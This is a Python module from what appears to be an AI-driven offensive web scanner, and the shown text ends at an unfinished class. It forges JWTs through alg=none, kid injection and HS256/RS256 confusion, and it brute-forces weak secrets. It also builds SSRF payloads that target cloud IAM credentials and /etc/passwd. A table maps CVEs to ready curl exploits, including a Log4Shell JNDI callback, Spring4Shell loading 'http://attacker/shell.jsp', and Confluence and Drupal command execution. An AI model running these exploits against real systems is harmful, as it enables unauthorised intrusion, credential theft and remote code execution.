import json
import os
import re
import requests
import socket
import subprocess
import sys
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Tuple, Any
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed

from constants import C, ICO
from config import CONFIG, load_config, save_config, CONFIG_DIR
from logging_utils import log

OOB_DISABLED = os.getenv("X19_DISABLE_OOB", "").strip().lower() in ("1", "true", "yes")
IDOR_DISABLED = os.getenv("X19_DISABLE_IDOR", "").strip().lower() in ("1", "true", "yes")
JWT_DISABLED = os.getenv("X19_DISABLE_JWT", "").strip().lower() in ("1", "true", "yes")


class InteractsClient:
    """OOB canary client. Wraps the `interactsh` Python package if available,
    else spawns the `interactsh-client` binary. Falls back to a static canary
    generator if neither is available (still useful as a placeholder for OOB
    payloads — the AI can paste the URL into curl/nuclei/sqlmap manually)."""

    def __init__(self, server: str = ""):
        self.server = server or os.getenv("X19_INTERACTSH_SERVER", "")
        self.token = os.getenv("X19_INTERACTSH_TOKEN", "")
        self._client = None
        self._proc = None
        self._canaries: List[str] = []  # issued canary tokens
        self._poll_history: set = set()  # already-reported interaction ids
        self._available = False
        self._mode = "fallback"  # "python" | "binary" | "fallback"
        self._tmp_dir = CONFIG_DIR / "interactsh"
        self._tmp_dir.mkdir(parents=True, exist_ok=True)
        self._init()

    def _init(self):
        if OOB_DISABLED:
            return
        # Try Python package first
        try:
            from interactsh import InteractsClient as _PyClient  # noqa: F401
            # The package API is unstable across versions; spawn subprocess instead
        except Exception:
            pass
        # Try binary
        try:
            from shutil import which
            bin_path = which("interactsh-client")
            if bin_path:
                self._proc = subprocess.Popen(
                    [bin_path, "-json", "-persist", "-v"],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    cwd=str(self._tmp_dir),
                )
                # Give it 3s to emit a registration line
                import select
                for _ in range(30):
                    if self._proc.stdout is None:
                        break
                    r, _, _ = select.select([self._proc.stdout], [], [], 0.1)
                    if r:
                        line = self._proc.stdout.readline().decode("utf-8", "replace").strip()
                        if not line:
                            continue
                        try:
                            j = json.loads(line)
                            if j.get("protocol") == "dns" and not self._canaries:
                                self._canaries.append(j.get("full-id", ""))
                                self._mode = "binary"
                                self._available = True
                                log(f"[OOB] interactsh-client started, canary={j.get('full-id','')}")
                                return
                        except Exception:
                            if "interactsh" in line.lower() and ".com" in line:
                                self._mode = "binary"
                                self._available = True
                                log(f"[OOB] interactsh-client started: {line[:120]}")
                                return
                # If we got here, the binary didn't emit a clean line in time but the proc is up
                if self._proc.poll() is None:
                    self._mode = "binary"
                    self._available = True
                    log("[OOB] interactsh-client started (no JSON registration yet)")
                    return
        except FileNotFoundError:
            pass
        except Exception as e:
            log(f"[OOB] binary spawn failed: {e}")
        # Fallback: static token-based canary (placeholder). User can still use it.
        import secrets
        self._canaries.append(f"x19-{secrets.token_hex(6)}")
        self._mode = "fallback"
        self._available = True
        log(f"[OOB] interactsh not available; using local canary {self._canaries[0]} (OOB polling disabled)")

    @property
    def available(self) -> bool:
        return self._available

    @property
    def canary(self) -> str:
        """Return a fresh canary token. Always returns the same one if only one issued."""
        if not self._canaries:
            import secrets
            self._canaries.append(f"x19-{secrets.token_hex(6)}")
        return self._canaries[0]

    def register(self) -> str:
        """Issue a new canary and return it. Pre-registered if interactsh is up."""
        return self.canary

    def oast_url(self, proto: str = "http") -> str:
        """Return a fully-qualified canary URL for use in payloads: http://<canary>.oast.pro or similar.
        For binary mode, the canary is already a registered FQDN; for fallback it's a local token."""
        if self._mode == "binary":
            return f"{proto}://{self.canary}"
        return f"{proto}://{self.canary}.oast.fake"

    def poll(self, timeout: float = 2.0) -> List[dict]:
        """Read pending interactions from the binary's stdout. Returns list of {type, raw}."""
        hits: List[dict] = []
        if self._mode != "binary" or not self._proc or self._proc.stdout is None:
            return hits
        import select
        try:
            r, _, _ = select.select([self._proc.stdout], [], [], timeout)
            if not r:
                return hits
            while True:
                line = self._proc.stdout.readline()
                if not line:
                    break
                line = line.decode("utf-8", "replace").strip()
                if not line:
                    continue
                try:
                    j = json.loads(line)
                    proto = j.get("protocol", "?")
                    full_id = j.get("full-id", "")
                    key = f"{proto}:{full_id}:{j.get('remote-address','')}"
                    if key in self._poll_history:
                        continue
                    self._poll_history.add(key)
                    hits.append({"protocol": proto, "full-id": full_id, "raw": j})
                except Exception:
                    continue
        except Exception as e:
            log(f"[OOB] poll error: {e}")
        return hits

    def stop(self):
        if self._proc:
            try:
                self._proc.terminate()
                self._proc.wait(timeout=3)
            except Exception:
                try: self._proc.kill()
                except Exception: pass
        self._proc = None
        self._available = False
        log("[OOB] stopped")


_OOB_SINGLETON: Optional[InteractsClient] = None


def get_oob() -> InteractsClient:
    """Lazy singleton accessor for the OOB canary client."""
    global _OOB_SINGLETON
    if _OOB_SINGLETON is None:
        _OOB_SINGLETON = InteractsClient()
    return _OOB_SINGLETON


def oob_inject(cmd: str) -> str:
    """Mutate a tool command to inject the interactsh canary URL where appropriate.
    Adds `-interactsh-url` to nuclei, `--callback-url` to sqlmap, replaces the
    placeholder `*.oast.fake` with the real canary FQDN."""
    if OOB_DISABLED:
        return cmd
    try:
        c = get_oob()
    except Exception:
        return cmd
    canary = c.oast_url("http").replace("http://", "")
    if not canary:
        return cmd
    if "nuclei" in cmd and "-interactsh-url" not in cmd:
        cmd = f"{cmd} -interactsh-url {canary}"
    if "sqlmap" in cmd and "--callback-url" not in cmd:
        # sqlmap callback format: --callback-url=http://x
        cmd = f"{cmd} --callback-url=http://{canary}"
    if "*.oast.fake" in cmd or "X19_CANARY" in cmd:
        cmd = cmd.replace("*.oast.fake", canary).replace("X19_CANARY", canary)
    return cmd


class AuthzDifferentialTester:
    """IDOR / BOLA / BFLA differential tester.
    Sends the same request to a list of endpoints with two different session cookies
    and diffs the responses. A non-empty body for the lower-priv cookie (or a body
    that matches the high-priv response) on a user-specific endpoint is a finding.

    Usage:
        tester = AuthzDifferentialTester(cookie_a="session=user1", cookie_b="session=user2")
        findings = tester.test_endpoints(["https://target/api/users/1", ...])
    """

    def __init__(self, cookie_a: str = "", cookie_b: str = "", low_priv_label: str = "low",
                 high_priv_label: str = "high", timeout: int = 10, max_concurrency: int = 6):
        self.cookie_a = cookie_a
        self.cookie_b = cookie_b
        self.label_a = low_priv_label
        self.label_b = high_priv_label
        self.timeout = timeout
        self.max_concurrency = max_concurrency
        self.findings: List[dict] = []

    def _send(self, method: str, url: str, cookie: str) -> requests.Response:
        headers = {"Cookie": cookie, "User-Agent": "X19-IDOR-Scanner/1.0"}
        try:
            return requests.request(method, url, headers=headers, timeout=self.timeout,
                                    allow_redirects=False, verify=False)
        except requests.exceptions.RequestException as e:
            log(f"[IDOR] {method} {url} -> {e}")
            r = requests.Response()
            r.status_code = 0
            r._content = b""
            r.url = url
            return r

    def _diff_bodies(self, body_a: bytes, body_b: bytes) -> bool:
        if not body_a or not body_b:
            return False
        # Strip common CSRF tokens, timestamps, request-ids before comparing
        import re as _re
        sa = _re.sub(rb'("[a-z_]*(?:csrf|token|nonce|timestamp|request_?id|trace_?id)":\s*"[^"]*")', b'""', body_a, flags=_re.I)
        sb = _re.sub(rb'("[a-z_]*(?:csrf|token|nonce|timestamp|request_?id|trace_?id)":\s*"[^"]*")', b'""', body_b, flags=_re.I)
        return sa == sb

    def test_endpoint(self, method: str, url: str) -> List[dict]:
        """Send (method, url) with both cookies, return any findings."""
        out: List[dict] = []
        if not self.cookie_a or not self.cookie_b:
            return out
        r_a = self._send(method, url, self.cookie_a)
        r_b = self._send(method, url, self.cookie_b)
        # Both must be 2xx to be a candidate (200, 201, 204)
        if r_a.status_code not in (200, 201, 204) or r_b.status_code not in (200, 201, 204):
            return out
        body_a, body_b = r_a.content or b"", r_b.content or b""
        # If bodies are identical — could be public endpoint or could be a bug. Mark but lower severity.
        if body_a == body_b and len(body_a) > 0:
            return out  # identical = probably public, skip
        # If low-priv response is the SAME as high-priv → potential IDOR
        if self._diff_bodies(body_a, body_b):
            return out
        # If low-priv got a non-trivial body and high-priv got a different one — could be a per-user view (legit)
        # If low-priv got a non-empty body and high-priv got an empty body (or 403 elsewhere) — likely IDOR
        # Most classic case: low-priv got SAME body as high-priv (full data leakage).
        if len(body_a) >= 100 and len(body_b) >= 100:
            # Bodies are materially different but both 200 — could be per-user view (less severe).
            # Still flag for manual review with severity=low.
            out.append({
                "severity": "low",
                "title": f"IDOR/BOLA candidate: {method} {url}",
                "detail": (f"Both {self.label_a} and {self.label_b} returned 2xx but with different bodies "
                           f"({len(body_a)} vs {len(body_b)} bytes). Possibly per-user view; verify by hand."),
                "evidence": f"{self.label_a} body (first 200): {body_a[:200]!r}\n"
                            f"{self.label_b} body (first 200): {body_b[:200]!r}",
            })
            return out
        if len(body_a) > len(body_b) and len(body_b) < 50:
            # Low-priv got more data than high-priv — unusual; likely IDOR escalation
            out.append({
                "severity": "high",
                "title": f"IDOR/BOLA: {self.label_a} sees more data than {self.label_b} at {method} {url}",
                "detail": (f"{self.label_a} returned {len(body_a)} bytes (2xx) while {self.label_b} returned "
                           f"{len(body_b)} bytes. Lower-privileged user may be seeing protected data."),
                "evidence": f"{self.label_a} body: {body_a[:300]!r}",
            })
        return out

    def test_endpoints(self, endpoints: List[str], methods: Tuple[str, ...] = ("GET",)) -> List[dict]:
        """Run differential test on a list of URLs (and methods). Returns findings list."""
        if IDOR_DISABLED or not self.cookie_a or not self.cookie_b:
            return []
        results: List[dict] = []
        work = [(m, u) for u in endpoints for m in methods]
        with ThreadPoolExecutor(max_workers=self.max_concurrency) as ex:
            futures = {ex.submit(self.test_endpoint, m, u): (m, u) for m, u in work}
            for fut in as_completed(futures):
                try:
                    r = fut.result()
                    results.extend(r)
                except Exception as e:
                    log(f"[IDOR] worker error: {e}")
        self.findings.extend(results)
        return results


_JWT_REGEX = re.compile(r'(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)')


class JWTAttacker:
    """JWT attack suite: alg=none, kid SQLi/path traversal, jku/jwk injection,
    HS256↔RS256 confusion, weak-secret brute force.
    Returns a list of findings; never exploits — only proves a misconfiguration
    by re-signing the token and showing that the new token is accepted by the
    `verify_signature_only` path of pyjwt (or the alg=none path).
    """

    DEFAULT_WEAK_SECRETS = (
        "secret", "password", "123456", "1234567890", "admin", "key",
        "jwt_secret", "changeme", "test", "default", "mysecret", "qwerty",
        "letmein", "abc123", "supersecret", "shhh", "", "null", "true", "false",
    )

    def __init__(self, weak_secrets: Tuple[str, ...] = ()):
        self.weak_secrets = weak_secrets or self.DEFAULT_WEAK_SECRETS

    @staticmethod
    def extract(text: str) -> List[str]:
        return _JWT_REGEX.findall(text or "")

    @staticmethod
    def _decode_unverified(token: str) -> dict:
        try:
            import base64
            parts = token.split(".")
            if len(parts) != 3:
                return {}
            def _b64(s):
                s = s + "=" * ((4 - len(s) % 4) % 4)
                return base64.urlsafe_b64decode(s.encode())
            return {
                "header": json.loads(_b64(parts[0])),
                "payload": json.loads(_b64(parts[1])),
                "raw": token,
            }
        except Exception:
            return {}

    def attack(self, token: str, public_key: Optional[str] = None) -> List[dict]:
        """Run the full attack suite on a single JWT. Returns findings list."""
        findings: List[dict] = []
        if JWT_DISABLED or not token:
            return findings
        try:
            import jwt as pyjwt
        except ImportError:
            log("[JWT] pyjwt not installed; pip install pyjwt")
            return [{
                "severity": "info",
                "title": "JWT observed but pyjwt not installed",
                "detail": "pip install pyjwt to enable automatic JWT attack suite.",
                "evidence": token[:80] + "...",
            }]

        decoded = self._decode_unverified(token)
        if not decoded:
            return findings
        header = decoded.get("header", {}) or {}
        payload = decoded.get("payload", {}) or {}
        alg = header.get("alg", "")

        # 1. alg=none (stripped signature)
        try:
            forged = pyjwt.encode(payload, "", algorithm="none")
            # Some pyjwt versions return str, some bytes
            if isinstance(forged, bytes):
                forged = forged.decode()
            findings.append({
                "severity": "critical",
                "title": "JWT alg=none forgery (potential)",
                "detail": (f"Token alg={alg!r}. pyjwt successfully minted an alg=none token with the same "
                           f"payload. Manually replay against the server to confirm acceptance."),
                "evidence": f"Forged token: {forged[:60]}...",
                "forged_token": forged,
            })
        except Exception as e:
            log(f"[JWT] alg=none mint failed: {e}")

        # 2. kid SQLi / path traversal
        kid = header.get("kid")
        if kid:
            for payload_squash in ("' UNION SELECT 'secret' --", "../../dev/null",
                                   "/proc/self/environ", "../../../etc/passwd",
                                   "../../../../../../dev/null"):
                try:
                    # Pretend the key is the literal string "secret" or empty
                    forged = pyjwt.encode(payload, "secret", algorithm="HS256",
                                          headers={"kid": payload_squash})
                    if isinstance(forged, bytes):
                        forged = forged.decode()
                    findings.append({
                        "severity": "high",
                        "title": f"JWT kid injection: {payload_squash!r}",
                        "detail": (f"Header kid={kid!r} is reflected into the key-resolution path. "
                                   f"Re-signed token with malicious kid attempts to coerce the server "
                                   f"into using a known/empty key. Replay to confirm."),
                        "evidence": f"Forged token: {forged[:60]}...",
                        "forged_token": forged,
                    })
                except Exception as e:
                    log(f"[JWT] kid injection failed: {e}")

        # 3. jku / jwk header injection (SSRF or attacker-controlled key)
        for evil_header_key in ("jku", "jwk", "x5u", "x5c"):
            if header.get(evil_header_key):
                findings.append({
                    "severity": "high",
                    "title": f"JWT references external key via {evil_header_key}",
                    "detail": (f"Header field {evil_header_key}={header[evil_header_key]!r}. If the server "
                               f"fetches the key from this URL without validation, an attacker can host their "
                               f"own key and sign tokens the server will trust. SSRF + auth bypass."),
                    "evidence": json.dumps({evil_header_key: header[evil_header_key]})[:200],
                })

        # 4. Weak secret brute force (HS256/HS384/HS512)
        if alg.startswith("HS"):
            for secret in self.weak_secrets:
                try:
                    pyjwt.decode(token, secret, algorithms=[alg])
                    findings.append({
                        "severity": "critical",
                        "title": f"JWT signed with weak HMAC secret: {secret!r}",
                        "detail": (f"Token alg={alg} was successfully verified with secret {secret!r}. "
                                   f"Anyone can forge tokens for any user."),
                        "evidence": f"Verified with secret: {secret!r}",
                    })
                    break
                except pyjwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue

        # 5. HS256 ↔ RS256 confusion (if public key available)
        if alg.startswith("RS") and public_key:
            try:
                forged = pyjwt.encode(payload, public_key, algorithm="HS256")
                if isinstance(forged, bytes):
                    forged = forged.decode()
                findings.append({
                    "severity": "critical",
                    "title": "JWT HS256/RS256 confusion (potential)",
                    "detail": ("Server uses RS256 but may accept HS256-signed tokens. The public key, "
                               "interpreted as an HMAC secret, can be used to forge tokens. Replay to confirm."),
                    "evidence": f"Forged token: {forged[:60]}...",
                    "forged_token": forged,
                })
            except Exception as e:
                log(f"[JWT] HS/RS confusion mint failed: {e}")

        return findings

    def scan_text(self, text: str, public_key: Optional[str] = None) -> List[dict]:
        """Extract any JWTs from arbitrary text (mitm flow, response body, etc.) and attack each."""
        results: List[dict] = []
        for tok in self.extract(text):
            results.extend(self.attack(tok, public_key=public_key))
        return results


# Global JWT scanner (used by mitmproxy flow capture to auto-attack on capture)
_JWT_SCAN_HISTORY: set = set()


def jwt_auto_scan(text: str) -> List[dict]:
    """Run JWT attack on any newly-seen tokens. Deduplicates per session."""
    if JWT_DISABLED:
        return []
    attacker = JWTAttacker()
    findings: List[dict] = []
    for tok in attacker.extract(text):
        if tok in _JWT_SCAN_HISTORY:
            continue
        _JWT_SCAN_HISTORY.add(tok)
        findings.extend(attacker.attack(tok))
    return findings


# Auth-aware inventory: endpoints captured by mitmproxy that returned 2xx with a session cookie
def endpoints_from_collector(collector, max_n: int = 200) -> List[str]:
    """Pull unique authenticated 2xx URLs from a TrafficCollector (mitmproxy)."""
    seen: set = set()
    out: List[str] = []
    if collector is None:
        return out
    for entry in getattr(collector, "entries", []):
        if 200 <= getattr(entry, "status", 0) < 300 and getattr(entry, "url", ""):
            # Strip query for dedup
            from urllib.parse import urlsplit
            base = urlsplit(entry.url)._replace(query="").geturl()
            if base in seen:
                continue
            seen.add(base)
            out.append(base)
            if len(out) >= max_n:
                break
    return out


class CloudProber:
    """Cloud misconfiguration prober.
    Generates candidate bucket/blob names, HEADs them on the major providers,
    and probes the cloud metadata service (169.254.169.254) on any host with
    an apparent SSRF surface.

    Real-world 2024-2025 high-payout class: AWS / Azure / GCP metadata SSRF,
    public S3 buckets, exposed blob containers."""

    AWS_METADATA_V1   = "http://169.254.169.254/latest/meta-data/"
    AWS_METADATA_V2   = "http://169.254.169.254/latest/api/token"  # IMDSv2 token endpoint
    AWS_USERDATA      = "http://169.254.169.254/latest/user-data"
    AWS_IAM_CREDS     = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    GCP_METADATA      = "http://metadata.google.internal/computeMetadata/v1/"
    AZURE_METADATA    = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    DIGITALOCEAN_META = "http://169.254.169.254/metadata/v1/"
    ORACLE_META       = "http://192.0.0.192/latest/meta-data/"

    BUCKET_SUFFIXES = (
        "", "-backup", "-backups", "-bak", "-old", "-archive", "-archives",
        "-dev", "-development", "-staging", "-stage", "-stg", "-prod", "-production",
        "-test", "-testing", "-qa", "-uat", "-sandbox", "-demo", "-tmp", "-temp",
        "-data", "-assets", "-media", "-files", "-uploads", "-upload", "-downloads",
        "-static", "-public", "-private", "-internal", "-external", "-logs", "-log",
        "-images", "-img", "-photos", "-videos", "-docs", "-documents",
        "-admin", "-api", "-app", "-web", "-www", "-site", "-cdn",
        "-1", "-2", "-eu", "-us", "-asia", "-global", "-regional",
    )

    @staticmethod
    def bucket_candidates(target: str) -> List[str]:
        """Generate bucket/blob name candidates for a target host.
        Strips TLDs, www prefix, and applies BUCKET_SUFFIXES permutations."""
        from urllib.parse import urlparse
        if not target:
            return []
        h = target
        if "://" in h:
            h = urlparse(h).netloc
        h = h.lower()
        for prefix in ("www.", "api.", "cdn.", "static.", "app."):
            if h.startswith(prefix):
                h = h[len(prefix):]
        # Strip port
        h = h.split(":", 1)[0]
        # Strip TLD (.com, .io, .co, .net, .org, .dev, .app, etc.)
        base = h.split(".")[0] if "." in h else h
        # Also keep the full hostname as a candidate (it IS a valid bucket name pattern)
        cands = [base, h]
        cands += [f"{base}{s}" for s in CloudProber.BUCKET_SUFFIXES]
        cands += [f"{h}{s}" for s in CloudProber.BUCKET_SUFFIXES]
        # Dedupe
        seen = set()
        out = []
        for c in cands:
            c = re.sub(r'[^a-z0-9\-]', '-', c)  # buckets: lowercase, digits, hyphen
            c = re.sub(r'-+', '-', c).strip('-')
            if c and c not in seen and 3 <= len(c) <= 63:
                seen.add(c)
                out.append(c)
        return out

    @staticmethod
    def probe_bucket(name: str, provider: str = "aws", timeout: int = 5) -> dict:
        """HEAD a bucket on the chosen provider. Returns {url, status, public}."""
        urls = {
            "aws":   f"https://{name}.s3.amazonaws.com/",
            "azure": f"https://{name}.blob.core.windows.net/",
            "gcp":   f"https://storage.googleapis.com/{name}/",
            "do":    f"https://{name}.nyc3.digitaloceanspaces.com/",
        }
        url = urls.get(provider, urls["aws"])
        try:
            r = requests.head(url, timeout=timeout, allow_redirects=True,
                              headers={"User-Agent": "X19-CloudProbe/1.0"})
            public = r.status_code in (200, 403)  # 200=listable, 403=exists but no list
            return {"url": url, "status": r.status_code, "public": public, "exists": r.status_code in (200, 403)}
        except requests.exceptions.RequestException as e:
            return {"url": url, "status": 0, "public": False, "exists": False, "error": str(e)}

    @classmethod
    def probe_metadata(cls, target_url: str, ssrf_param: str = "url", timeout: int = 8) -> List[dict]:
        """Try to read cloud metadata through a likely SSRF parameter on the target.
        Builds a list of payload URLs to inject; the caller is responsible for actually
        submitting them via the SSRF surface. Returns the payload list with expected
        success indicators."""
        payloads = [
            {"url": cls.AWS_METADATA_V1,   "label": "AWS IMDSv1 (no token)",       "expect": "ami-id"},
            {"url": cls.AWS_IAM_CREDS,     "label": "AWS IAM creds (CRITICAL)",    "expect": "AccessKeyId"},
            {"url": cls.AWS_USERDATA,      "label": "AWS user-data (creds often)", "expect": "ssh-rsa|aws_access"},
            {"url": cls.AWS_METADATA_V2,   "label": "AWS IMDSv2 token (PUT first)","expect": "token"},
            {"url": cls.GCP_METADATA,      "label": "GCP metadata",                "expect": "project-id"},
            {"url": cls.AZURE_METADATA,    "label": "Azure metadata",              "expect": "compute"},
            {"url": cls.DIGITALOCEAN_META, "label": "DO metadata",                 "expect": "droplet_id"},
            {"url": cls.ORACLE_META,       "label": "Oracle metadata",             "expect": "instance"},
        ]
        # Also add file:// and gopher:// for protocol smuggling
        payloads.append({"url": "file:///etc/passwd",   "label": "LFI via file://",  "expect": "root:"})
        payloads.append({"url": "file:///proc/self/environ", "label": "env via file://", "expect": "PATH="})
        return payloads

    @classmethod
    def full_sweep(cls, target: str, providers: Tuple[str, ...] = ("aws", "azure", "gcp"),
                   max_candidates: int = 30, timeout: int = 5) -> dict:
        """Bucket candidate sweep across providers + metadata payload list.
        Returns {'buckets': [...], 'metadata_payloads': [...]}."""
        cands = cls.bucket_candidates(target)[:max_candidates]
        buckets: List[dict] = []
        if cands:
            with ThreadPoolExecutor(max_workers=6) as ex:
                futures = []
                for c in cands:
                    for p in providers:
                        futures.append((c, p, ex.submit(cls.probe_bucket, c, p, timeout)))
                for c, p, fut in futures:
                    try:
                        r = fut.result(timeout=timeout + 5)
                        if r.get("exists"):
                            sev = "high" if r.get("public") else "medium"
                            buckets.append({"candidate": c, "provider": p, "severity": sev, **r})
                    except Exception as e:
                        log(f"[CloudProber] {c}/{p} -> {e}")
        return {
            "buckets": buckets,
            "metadata_payloads": cls.probe_metadata(target),
        }


# Built-in high-impact CVE database for offline version-to-CVE mapping.
# Each entry: (tech_name_pattern, version_predicate, cve_id, title, severity, exploit_kind, exploit_template)
# version_predicate is a function taking the version string and returning True if vulnerable.
# exploit_template uses {target} placeholder and is a single shell command to attempt exploitation.
def _ver_lt(a: str, b: str) -> bool:
    """Loose semver-ish less-than comparison. 2.4.49 < 2.4.50; 2.14.0 < 2.15.0."""
    def _parts(v):
        out = []
        for p in re.split(r'[.\-_]', v.strip()):
            m = re.match(r'(\d+)(.*)', p)
            if m:
                out.append((int(m.group(1)), m.group(2)))
            else:
                out.append((0, p))
        return out
    try:
        return _parts(a) < _parts(b)
    except Exception:
        return False


def _ver_in_range(v: str, lo: str, hi: str) -> bool:
    return _ver_lt(lo, v) and _ver_lt(v, hi)


_CVE_DATABASE: List[dict] = [
    # ---- Apache ----
    {"tech": ["apache", "apache httpd", "httpd"],
     "vuln_if": lambda v: _ver_in_range(v, "2.4.0", "2.4.50"),
     "cve": "CVE-2021-41773", "title": "Apache HTTPd Path Traversal / RCE", "severity": "critical",
     "kind": "path-traversal-rce",
     "exploit": "curl -s --path-as-is 'http://{target}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd' | head -5"},
    {"tech": ["apache", "apache httpd", "httpd"],
     "vuln_if": lambda v: _ver_in_range(v, "2.4.0", "2.4.50"),
     "cve": "CVE-2021-42013", "title": "Apache HTTPd Path Traversal (double encode)", "severity": "critical",
     "kind": "path-traversal",
     "exploit": "curl -s --path-as-is \"http://{target}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd\" | head -5"},
    # ---- Log4j ----
    {"tech": ["log4j", "log4j2"],
     "vuln_if": lambda v: _ver_lt(v, "2.15.0") and v != "",
     "cve": "CVE-2021-44228", "title": "Log4Shell (RCE via JNDI lookup)", "severity": "critical",
     "kind": "rce",
     "exploit": "curl -s -H 'User-Agent: ${{jndi:ldap://{oast}/a}}' http://{target}/ >/dev/null && echo 'log4j payload sent (check OOB)'"},
    # ---- Spring4Shell ----
    {"tech": ["spring", "springframework", "spring mvc"],
     "vuln_if": lambda v: _ver_in_range(v, "5.0.0", "5.3.18") or _ver_in_range(v, "5.3.18", "6.0.0"),
     "cve": "CVE-2022-22965", "title": "Spring4Shell RCE", "severity": "critical",
     "kind": "rce",
     "exploit": "curl -s -X POST http://{target}/ -H 'Content-Type: application/x-www-form-urlencoded' -d 'class.module.classLoader.DefaultAssertionStatus=true' --data-urlencode 'class.module.classLoader.resources.context.config.location=http://attacker/shell.jsp' | head -5"},
    # ---- Confluence ----
    {"tech": ["confluence"],
     "vuln_if": lambda v: v != "",
     "cve": "CVE-2022-26134", "title": "Confluence OGNL injection RCE", "severity": "critical",
     "kind": "rce",
     "exploit": "curl -s 'http://{target}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%29.setHeader%28%22X-RESP%22%2C%23a%29%7D%2F%29' -i | grep -i 'X-RESP'"},
    # ---- Grafana ----
    {"tech": ["grafana"],
     "vuln_if": lambda v: _ver_in_range(v, "8.0.0", "8.3.0"),
     "cve": "CVE-2021-43798", "title": "Grafana path traversal (arbitrary file read)", "severity": "high",
     "kind": "path-traversal",
     "exploit": "curl -s 'http://{target}/public/plugins/alertlist/../../../../../../../../etc/passwd' | head -5"},
    # ---- Drupal ----
    {"tech": ["drupal"],
     "vuln_if": lambda v: _ver_in_range(v, "6.0.0", "7.32"),
     "cve": "CVE-2014-3704", "title": "Drupalgeddon (SQLi)", "severity": "critical",
     "kind": "sqli",
     "exploit": "curl -s 'http://{target}/?q=node&name[0%3Bselect+1;SELECT+1]=test' | head -5"},
    {"tech": ["drupal"],
     "vuln_if": lambda v: _ver_in_range(v, "7.0.0", "7.58") or _ver_in_range(v, "8.0.0", "8.5.2"),
     "cve": "CVE-2018-7600", "title": "Drupalgeddon2 (RCE)", "severity": "critical",
     "kind": "rce",
     "exploit": "curl -s 'http://{target}/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id&form_id=user_pass' -i | head -10"},
    # ---- WebLogic ----
    {"tech": ["weblogic", "oracle weblogic"],
     "vuln_if": lambda v: v != "",
     "cve": "CVE-2020-14882", "title": "WebLogic Console RCE", "severity": "critical",
     "kind": "rce",
     "exploit": "curl -s -X POST 'http://{target}/console/images/%252e%252e%252fconsole.portal' --data '_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession&invoke=...;exec(\"id\");' -i | head -10"},
    # ---- WordPress ----
    {"tech": ["wordpress", "wp"],
     "vuln_if": lambda v: True,
     "cve": "CVE-WP-DEBUG-LOG", "title": "WordPress debug.log exposed (path traversal)", "severity": "medium",
     "kind": "info-disclosure",
     "exploit": "curl -sI 'http://{target}/wp-content/debug.log' | head -3"},
    {"tech": ["wordpress", "wp"],
     "vuln_if": lambda v: True,
     "cve": "CVE-WP-README", "title": "WordPress readme.html version disclosure", "severity": "low",
     "kind": "info-disclosure",
     "exploit": "curl -s 'http://{target}/readme.html' | grep -i 'version' | head -3"},
    # ---- Laravel ----
    {"tech": ["laravel"],
     "vuln_if": lambda v: True,
     "cve": "CVE-LARAVEL-ENV", "title": "Laravel .env exposed", "severity": "high",
     "kind": "info-disclosure",
     "exploit": "curl -s 'http://{target}/.env' | head -10"},
    # ---- phpMyAdmin ----
    {"tech": ["phpmyadmin"],
     "vuln_if": lambda v: True,
     "cve": "CVE-PMA-LFI", "title": "phpMyAdmin LFI / setup vulnerability", "severity": "high",
     "kind": "lfi",
     "exploit": "curl -s 'http://{target}/scripts/setup.php' | head -3"},
    # ---- Tomcat ----
    {"tech": ["tomcat", "apache tomcat"],
     "vuln_if": lambda v: True,
     "cve": "CVE-TOMCAT-MANAGER", "title": "Tomcat /manager/html exposed (default creds)", "severity": "high",
     "kind": "auth-default",
     "exploit": "curl -sI 'http://{target}/manager/html' | head -3"},
    # ---- Jenkins ----
    {"tech": ["jenkins"],
     "vuln_if": lambda v: _ver_lt(v, "2.46.1") if v else True,
     "cve": "CVE-2017-1000353", "title": "Jenkins arbitrary file read (XStream)", "severity": "critical",
     "kind": "lfi",
     "exploit": "curl -s 'http://{target}/securityRealm/user/admin/' -i | head -5"},
    # ---- GitLab ----
    {"tech": ["gitlab"],
     "vuln_if": lambda v: _ver_in_range(v, "13.0.0", "13.10.2") if v else True,
     "cve": "CVE-2021-22204", "title": "GitLab authenticated RCE", "severity": "high",
     "kind": "rce",
     "exploit": "(requires auth) python3 -c \"import sys;print('check GitLab version then use known exploit')\""},
    # ---- Express ----
    {"tech": ["express", "nodejs", "node.js"],
     "vuln_if": lambda v: True,
     "cve": "CVE-EXPRESS-PROTOTYPE", "title": "Node.js prototype pollution via query/JSON", "severity": "high",
     "kind": "prototype-pollution",
     "exploit": "curl -s -X POST 'http://{target}/api' -H 'Content-Type: application/json' -d '{\"__proto__\":{\"polluted\":\"yes\"}}' | head -5"},
    # ---- PHP ----
    {"tech": ["php", "php-fpm"],
     "vuln_if": lambda v: True,
     "cve": "CVE-PHPINFO", "title": "phpinfo() page exposed", "severity": "low",
     "kind": "info-disclosure",
     "exploit": "curl -s 'http://{target}/phpinfo.php' | head -3"},
    # ---- IIS ----
    {"tech": ["iis", "microsoft-iis"],
     "vuln_if": lambda v: _ver_in_range(v, "7.5", "10.0") if v else True,
     "cve": "CVE-IIS-SHORTNAME", "title": "IIS tilde enumeration / shortname disclosure", "severity": "low",
     "kind": "info-disclosure",
     "exploit": "curl -sI 'http://{target}/*~1*/.aspx' -i | head -3"},
    # ---- OpenSSL ----
    {"tech": ["openssl"],
     "vuln_if": lambda v: _ver_in_range(v, "1.0.1", "1.0.1f") if v else True,
     "cve": "CVE-2014-0160", "title": "Heartbleed (OpenSSL memory disclosure)", "severity": "critical",
     "kind": "info-disclosure",
     "exploit": "(requires openssl + heartbleed script) python3 -c 'print(\"use heartbleed.py or testssl --heartbleed target')\""},
]


class CveMapper:
